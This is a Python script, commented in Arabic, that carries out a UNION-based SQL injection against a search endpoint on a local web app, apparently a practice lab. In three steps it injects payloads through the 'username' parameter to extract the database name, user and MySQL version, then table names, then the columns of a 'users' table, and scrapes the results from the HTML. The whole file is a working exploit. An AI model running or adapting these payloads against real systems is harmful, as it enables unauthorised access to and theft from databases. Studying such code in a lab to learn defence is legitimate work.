import requests

URL = "http://127.0.0.1:5000/search"

def extract_database_info():
    print("💀 استخراج معلومات قاعدة البيانات...\n")
    
    # استخراج اسم قاعدة البيانات + المستخدم + الإصدار
    payload = "' UNION SELECT 1, database(), user(), version() -- "
    r = requests.get(URL, params={"username": payload})
    
    print("الرد من الموقع:")
    print("-" * 50)
    # ابحث عن البيانات في الجدول
    import re
    rows = re.findall(r'<td>(.*?)</td>', r.text)
    if rows:
        print(f"  📦 اسم قاعدة البيانات: {rows[1]}")
        print(f"  👤 المستخدم الحالي:   {rows[2]}")
        print(f"  🔢 إصدار MySQL:       {rows[3]}")

def extract_tables():
    print("\n📋 استخراج أسماء الجداول...\n")
    payload = "' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database() -- "
    r = requests.get(URL, params={"username": payload})
    import re
    rows = re.findall(r'<td>(.*?)</td>', r.text)
    for i in range(1, len(rows), 4):
        print(f"  🗂️ جدول: {rows[i]}")

def extract_columns():
    print("\n📊 استخراج أعمدة جدول users...\n")
    payload = "' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users' -- "
    r = requests.get(URL, params={"username": payload})
    import re
    rows = re.findall(r'<td>(.*?)</td>', r.text)
    for i in range(1, len(rows), 4):
        print(f"  📌 عمود: {rows[i]}")

if __name__ == "__main__":
    extract_database_info()
    extract_tables()
    extract_columns()